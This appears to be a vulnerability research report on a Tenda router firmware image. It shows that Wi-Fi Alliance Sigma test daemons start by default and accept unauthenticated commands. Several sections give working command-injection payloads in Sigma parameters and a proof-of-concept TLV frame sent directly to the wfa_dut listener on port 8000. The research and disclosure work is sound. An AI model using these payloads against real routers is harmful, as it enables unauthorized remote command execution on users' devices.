# R07 WFA/Sigma Probe Results

Date: 2026-04-21 local / 2026-04-22 UTC

Target:

- Archive: `downloads/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip`
- Extracted rootfs: `work/test-extract/rootfs_0`
- Runtime container used for controlled checks: `tenda-b104-native-httpd`

## Status From Worklog

The current working environment is a narrow native-web emulation, not a full
OpenWrt board boot. It runs native `httpd`, `td_server`, `ubusd`, and support
daemons under QEMU user-mode with a minimal LAN-IP shim. Full `rc.d` boot is not
running, so WFA/Sigma services are present in the extracted firmware but are not
part of the live web-only launcher unless started manually for testing.

The last completed work before this R07 pass was the native web route/auth
matrix in `ROUTE_PROBE_RESULTS.md`. Hidden web routes `/goform/telnet` and
`/goform/ate` were verified, then cleaned up. The live container should normally
only expose native `httpd` on `80/tcp` and `443/tcp`.

## Init-Script Evidence

`/etc/init.d/wfa_dut`:

- `START=90`.
- Reads interface names from `/etc/wireless/l1profile.dat`.
- Starts `/sbin/wfa_dut $wifi1_ifname 8000`.
- Starts `/sbin/wfa_dut $wifi2_ifname 8080`.
- Calls `/etc/init.d/sigma disable`.

`/etc/init.d/sigma`:

- `START=92`.
- Uses `wfa_dut_port=8000` and `wfa_ca_port=9000`.
- Kills existing `wfa_ca` and `wfa_dut`.
- Starts `wfa_dut apcli0 8000`.
- Exports `WFA_ENV_AGENT_IPADDR=$br_ip` and `WFA_ENV_AGENT_PORT=8000`.
- Starts `wfa_ca br-lan 9000`.

`/etc/rc.d` contains both startup symlinks in the extracted stock image:

```text
S90wfa_dut -> ../init.d/wfa_dut
S92sigma -> ../init.d/sigma
```

Practical startup nuance: because `wfa_dut` runs first and disables `sigma`,
the expected stock path is `wfa_dut`, not both daemons together. `sigma` remains
available and enabled in the static rc.d tree, but it is disabled by the earlier
script during startup.

## Wireless Profile Nuance

The current `l1profile.dat` contains:

```text
INDEX0_main_ifname=ra0;rai0
```

No `INDEX1_main_ifname` entry was found. As written, the `wfa_dut` init script's
first launch receives the literal interface string `ra0;rai0`, and the second
launch likely receives only `8080` as an argument because `wifi2_ifname` is
empty. A real board boot may rewrite this profile, but from the extracted image
alone the advertised dual `8000`/`8080` startup is fragile.

## Runtime Listener Confirmation

Before the initial manual testing, the live web container had only native web
listeners:

```text
0.0.0.0:80/tcp
0.0.0.0:443/tcp
```

Controlled `wfa_dut` launch:

```text
chroot .../rootfs_0 /sbin/wfa_dut lo 8000
```

Observed:

```text
127.0.0.1:8000/tcp LISTEN /sbin/wfa_dut
```

Controlled `wfa_ca` launch with a local DUT agent:

```text
WFA_ENV_AGENT_IPADDR=127.0.0.1 WFA_ENV_AGENT_PORT=8000 \
chroot .../rootfs_0 /sbin/wfa_ca lo 9000
```

Observed:

```text
127.0.0.1:8000/tcp LISTEN /sbin/wfa_dut
0.0.0.0:9000/tcp  LISTEN /sbin/wfa_ca
```

`/proc/net/tcp` also showed an established localhost connection between
`wfa_ca` and `wfa_dut`.

Both processes were killed after the check. Final listener state returned to:

```text
0.0.0.0:80/tcp
0.0.0.0:443/tcp
```

Follow-up closer-to-boot testing was later recorded in
`RCD_BOOT_PROBE_RESULTS.md`. The best procd-backed rc.d pass
(`tenda-b104-rcd-procd-20260421_214544`) prestarted `ubusd` and `procd`, then
walked `/etc/rc.d/S* boot` in stock order with per-script timeouts. In that
pass:

- `S90wfa_dut` launched `/sbin/wfa_dut ra0;rai0 8000`.
- The process remained alive and listened on `0.0.0.0:8000/tcp`.
- `S90wfa_dut` removed `S92sigma`, so `sigma` did not run in the stock-order
  boot walk.
- A manually added `wfa_ca` on `9000/tcp` successfully forwarded benign Sigma
  commands to the stock-started `wfa_dut`.

Benign command results through `wfa_ca:9000`:

```text
sta_get_mac_address,interface,ra0
-> status,RUNNING
-> status,COMPLETE,mac,00:00:00:00:00:00

sta_get_ip_config,interface,ra0
-> status,RUNNING
-> status,COMPLETE,dhcp,1,ip,,mask,,primary-dns,::1,secondary-dns,0
```

## Live Command Injection Checks

Follow-up probing in `tenda-b104-rcd-procd-20260421_214544` confirmed that
multiple Sigma parameters reach shell commands in the stock-started
`wfa_dut`. `wfa_ca` was restarted as needed with:

```text
WFA_ENV_AGENT_IPADDR=172.17.0.6 WFA_ENV_AGENT_PORT=8000 /sbin/wfa_ca br-lan 9000
```

Confirmed marker-file execution:

```text
sta_get_mac_address,interface,ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;#
-> status,RUNNING
-> status,COMPLETE,mac,00:00:00:00:00:00
created /tmp/wfa_inj_iface containing WFA_IFACE

sta_get_ip_config,interface,ra0;echo WFA_IPCFG>/tmp/wfa_inj_ipcfg;#
-> status,RUNNING
-> status,COMPLETE,dhcp,1,ip,,mask,,primary-dns,::1,secondary-dns,0
created /tmp/wfa_inj_ipcfg containing WFA_IPCFG

sta_set_ip_config,interface,ra0,dhcp,0,ip,1;>/tmp/x;#,mask,255.255.255.0,defaultGateway,192.0.2.1,primary-dns,1.1.1.1,secondary-dns,8.8.8.8
-> status,RUNNING
-> status,COMPLETE
created /tmp/x
```

`sta_set_ip_config` truncates several parsed fields, so a shorter payload was
needed there. The `sta_verify_ip_connection` and `traffic_send_ping` marker
attempts returned only `status,RUNNING`, did not create markers, and caused
`wfa_ca` to dump core in this QEMU/chroot harness. Those remain crash/DoS
leads rather than confirmed command-execution paths.

## Direct `wfa_dut:8000` Injection

`wfa_ca` is not required for exploitation. A TCP proxy between `wfa_ca` and
`wfa_dut` showed that `sta_get_mac_address` is forwarded as a 632-byte binary
TLV:

```text
tag    0x000c, little-endian
length 0x0274, little-endian
data   interface string padded to 0x0274 bytes
```

A crafted TLV sent directly to a temporary `wfa_dut:8010` listener created
`/tmp/direct_poc`. The same crafted TLV sent directly to the stock/default
`wfa_dut:8000` listener created `/tmp/direct_8000`:

```text
payload = b"ra0;echo DIRECT8000>/tmp/direct_8000;#"
frame   = struct.pack("<HH", 12, 0x274) + payload.ljust(0x274, b"\x00")
target  = 127.0.0.1:8000
result  = /tmp/direct_8000 containing DIRECT8000
```

This confirms unauthenticated command injection against the stock-started DUT
control listener itself. `wfa_ca` is only a text-to-binary convenience layer.

## Binary Evidence

Both `/sbin/wfa_dut` and `/sbin/wfa_ca` are stripped AArch64 dynamically linked
`EXEC` binaries using `/lib/ld-musl-aarch64.so.1`. They are non-PIE executables
with NX stack and GNU_RELRO, but no `BIND_NOW` entry was present.

`wfa_dut` imports include:

```text
socket bind listen accept recv send sendto connect
system popen pclose
strcpy sprintf strncat memcpy
pthread_create
```

High-risk command templates and handlers visible in `wfa_dut` strings include:

```text
/sbin/ifconfig %s %s netmask %s
/sbin/route add default gw %s
ping %s -c 3 -W %u
ifconfig %s > /tmp/ipconfig.txt
wpa_cli -i %s set_network 0 ssid '"%s"'
wpa_cli -i %s set_network 0 password '"%s"'
wpa_cli -i%s set_network 0 identity '"%s"'
iwpriv %s ...
echo streamid=...;wfaping.sh %s %s ...
echo streamid=...;wfaping6.sh %s %s ...
/usr/bin/wfa_con -t %d %s
wfa_cli_cmd
wfaStaCliCommand
```

`wfa_ca` exposes text command names matching Wi-Fi Alliance/Sigma control APIs,
including:

```text
traffic_send_ping
traffic_agent_config
traffic_agent_send
traffic_agent_receive_start
sta_set_ip_config
sta_set_encryption
sta_set_psk
sta_set_eaptls
sta_set_eapttls
sta_set_peap
sta_associate
sta_disconnect
sta_reset_default
sta_set_wireless
sta_scan
dev_send_frame
wfa_cli_cmd
```

## CLI Allowlist

`/etc/WfaEndpoint/wfa_cli.txt` contains:

```text
#wfa_test_cli-TRUE,
sta_reset_parm-TRUE,
dev_send_frame-TRUE,
```

This suggests the generic CLI command path checks a local allowlist. The broad
`wfa_test_cli` entry is commented out, but two commands are enabled. Separately,
many standard WFA/Sigma handlers remain reachable through the control protocol
and build shell commands themselves.

## Assessment

R07 remains High severity.

What is proven:

- The stock image contains rc.d startup hooks for WFA/Sigma test daemons.
- `wfa_dut` is the practical default startup path and disables `sigma`.
- A procd-backed stock-order rc.d walk launches `wfa_dut` on `0.0.0.0:8000/tcp`.
- `wfa_dut` and `wfa_ca` open TCP control listeners when launched.
- `wfa_ca` listens on all interfaces for port `9000` in the controlled test.
- The daemons contain unauthenticated-looking WFA/Sigma command handlers and
  shell-backed operations that can change Wi-Fi config, network config, and
  generate traffic.
- Benign Sigma CAPI commands can traverse `wfa_ca:9000` to `wfa_dut:8000` and
  return structured `status,RUNNING` / `status,COMPLETE` responses.
- Command injection was confirmed in live handlers for `sta_get_mac_address`,
  `sta_get_ip_config`, and `sta_set_ip_config` by creating marker files inside
  the firmware rootfs.
- Direct binary TLV injection against the stock-started `wfa_dut:8000` listener
  was confirmed by creating `/tmp/direct_8000`.

What is not yet proven:

- Exact exposure on real hardware after first boot, because the current
  launcher is not a full rc.d boot and the wireless profile may be rewritten by
  board scripts.
- Whether the real hardware firewall or bridge policy exposes `wfa_dut:8000`
  to LAN/Wi-Fi clients. In the harness it bound `0.0.0.0:8000`.
- Whether the `sta_verify_ip_connection` and traffic-generation shell templates
  are injectable, because the tested marker attempts crashed `wfa_ca` before
  marker creation in this harness.

Recommended next step: capture `system()`/`popen()` calls while replaying the
confirmed marker commands and then reduce the `wfa_ca` crashes in
`sta_verify_ip_connection` and `traffic_send_ping` to stable reproducers.
